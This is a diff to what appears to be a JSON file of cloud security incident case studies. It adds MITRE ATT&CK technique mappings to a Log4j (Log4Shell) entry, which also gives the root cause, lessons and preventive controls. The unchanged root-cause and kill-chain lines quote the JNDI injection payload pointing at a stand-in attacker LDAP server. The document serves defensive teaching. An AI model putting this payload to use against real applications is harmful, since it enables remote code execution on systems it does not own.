@@ -76,6 +76,14 @@
       "rootCause": "Apache Log4j 2.x (versions 2.0-beta9 through 2.14.1) had a feature allowing JNDI lookups in log messages. An attacker could inject a string like ${jndi:ldap://attacker.com/exploit} into any field that gets logged (HTTP headers, form fields, user agents), causing the vulnerable application to connect to the attacker's LDAP server and download and execute arbitrary Java classes. The vulnerability was trivially exploitable — a single crafted HTTP request could achieve RCE.",
       "keyLesson": "Dependency management is a cloud security imperative. A single vulnerable library (Log4j) affected the entire cloud ecosystem. Organisations need Software Bill of Materials (SBOM) to identify vulnerable dependencies, WAF rules to block exploit strings, and egress filtering to prevent JNDI callback connections.",
       "preventiveControls": ["TVM-01", "TVM-02", "AIS-01", "AIS-04", "IVS-04", "IVS-09"],
+      "mitreAttackCloud": [
+        { "technique": "T1190", "name": "Exploit Public-Facing Application", "usage": "Attackers exploited the Log4j JNDI injection vulnerability in internet-facing Java applications to achieve remote code execution." },
+        { "technique": "T1059", "name": "Command and Scripting Interpreter", "usage": "After initial exploitation, attackers used command interpreters (bash, PowerShell) to execute follow-on payloads on compromised instances." },
+        { "technique": "T1105", "name": "Ingress Tool Transfer", "usage": "The JNDI lookup caused the vulnerable application to download and execute attacker-hosted Java classes from external LDAP/HTTP servers." },
+        { "technique": "T1505.003", "name": "Server Software Component: Web Shell", "usage": "Attackers installed webshells on compromised servers for persistent remote access." },
+        { "technique": "T1046", "name": "Network Service Scanning", "usage": "Attackers scanned internal networks from compromised cloud instances to discover additional services and pivot targets." },
+        { "technique": "T1496", "name": "Resource Hijacking", "usage": "Cryptomining was the most common post-exploitation activity, hijacking cloud compute resources for cryptocurrency mining." }
+      ],
       "killChain": [
         "Reconnaissance: Scanned internet-facing applications for Log4j vulnerability by injecting JNDI payloads in common fields (User-Agent, X-Forwarded-For, form inputs, API parameters)",
         "Initial Access: Sent crafted request containing ${jndi:ldap://attacker-server/exploit} to vulnerable application",
